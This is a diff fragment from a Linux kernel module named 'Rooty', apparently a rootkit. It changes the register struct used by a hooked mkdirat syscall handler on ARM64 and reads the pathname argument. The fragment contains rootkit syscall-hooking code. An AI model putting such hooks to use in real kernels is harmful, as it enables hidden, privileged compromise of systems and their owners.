@@ -10,11 +10,11 @@ MODULE_AUTHOR("Ariel Alon");
 MODULE_DESCRIPTION("Rooty");
 MODULE_VERSION("0.01");
 
-static asmlinkage long (*orig_mkdirat)(const struct pt_regs *);
-asmlinkage int hook_mkdirat(const struct pt_regs *regs);
+static asmlinkage long (*orig_mkdirat)(const struct ftrace_regs *);
+asmlinkage int hook_mkdirat(const struct ftrace_regs *regs);
 
-asmlinkage int hook_mkdirat(const struct pt_regs *regs) {
-    // int dfd = regs->regs[0];                       // x0: directory file descriptor
+asmlinkage int hook_mkdirat(const struct ftrace_regs *regs) {
+    // int dfd = regs->regs[0];                    // x0: directory file descriptor
     char __user *pathname = (char *)regs->regs[1]; // x1: pathname
     char dir_name[NAME_MAX] = {0};
 
